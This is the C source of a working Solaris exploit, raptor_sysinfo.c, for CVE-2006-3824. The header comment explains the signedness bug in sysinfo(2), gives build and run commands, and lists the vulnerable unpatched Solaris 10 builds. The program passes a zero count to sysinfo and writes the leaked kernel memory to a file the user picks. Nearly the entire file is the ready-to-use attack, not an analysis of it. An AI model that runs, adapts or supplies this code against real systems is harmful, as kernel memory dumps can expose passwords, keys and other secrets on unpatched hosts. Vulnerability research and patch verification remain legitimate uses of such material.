/*
 * $Id: raptor_sysinfo.c,v 1.2 2006/08/22 13:48:39 raptor Exp $
 *
 * raptor_sysinfo.c - Solaris sysinfo(2) kernel memory leak
 * Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * systeminfo.c for Sun Solaris allows local users to read kernel memory via 
 * a 0 variable count argument to the sysinfo system call, which causes a -1 
 * argument to be used by the copyout function. NOTE: this issue has been 
 * referred to as an integer overflow, but it is probably more like a 
 * signedness error or integer underflow (CVE-2006-3824).
 *
 * http://en.wikipedia.org/wiki/Pitagora_Suicchi
 *
 * Greets to prdelka, who also exploited this vulnerability.
 *
 * I should also definitely investigate the old sysinfo(2) vulnerability 
 * described in CVE-2003-1062, affecting Solaris/SPARC 2.6 through 9 and 
 * Solaris/x86 2.6 through 8... It may come in handy sooner or later;)
 *
 * Usage:
 * $ gcc raptor_sysinfo.c -o raptor_sysinfo -Wall
 * $ ./raptor_sysinfo kerndump 666666
 * [...]
 * $ ls -l kerndump 
 * -rwx------   1 raptor   other     666666 Aug 22 14:41 kerndump
 *
 * Vulnerable platforms (SPARC):
 * Solaris 10 without patch 118833-09 [tested]
 *
 * Vulnerable platforms (x86):
 * Solaris 10 without patch 118855-06 [untested]
 */

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <sys/systeminfo.h>

#define	INFO1	"raptor_sysinfo.c - Solaris sysinfo(2) kernel memory leak"
#define	INFO2	"Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>"

#define BUFSIZE 536870911

int 	errno;

int main(int argc, char **argv)
{
	int 	fd;
	size_t	out, bufsize = BUFSIZE;
	char	*buf;

	/* print exploit information */
	fprintf(stderr, "%s\n%s\n\n", INFO1, INFO2);

	/* read command line */
	if (argc < 2) {
		fprintf(stderr, "usage: %s outfile [outsize]\n\n", argv[0]);
		exit(1);
	}
	if (argc > 2)
		if ((bufsize = atoi(argv[2])) == 0) {
			fprintf(stderr, "Error (atoi): invalid outsize\n");
			exit(1);
		}

	/* print some output */
	fprintf(stderr, "Using outfile\t: %s\n", argv[1]);
	fprintf(stderr, "Using outsize\t: %u\n\n", bufsize);

	/* prepare the output buffer */
	if ((buf = (char *)malloc(bufsize)) == NULL) {
		perror("Error (malloc)");
		fprintf(stderr, "Hint: Try again with a smaller output size\n");
		exit(1);
	}
	memset(buf, 0, bufsize);

	/* Pitagora Suicchi! */
	sysinfo(SI_SYSNAME, buf, 0);

	/* save output to outfile */
	if ((fd = open(argv[1], O_RDWR | O_CREAT | O_TRUNC, 0700)) < 0) {
		perror("Error (open)");
		free(buf);
		exit(1);
	}
	out = write(fd, buf, bufsize);
	fprintf(stderr, "Pitagora Suicchi! %u bytes written to %s\n", out, argv[1]);
	fprintf(stderr, "Hint: Try also with a bigger output size\n");

	close(fd);
	free(buf);

	exit(0);
}
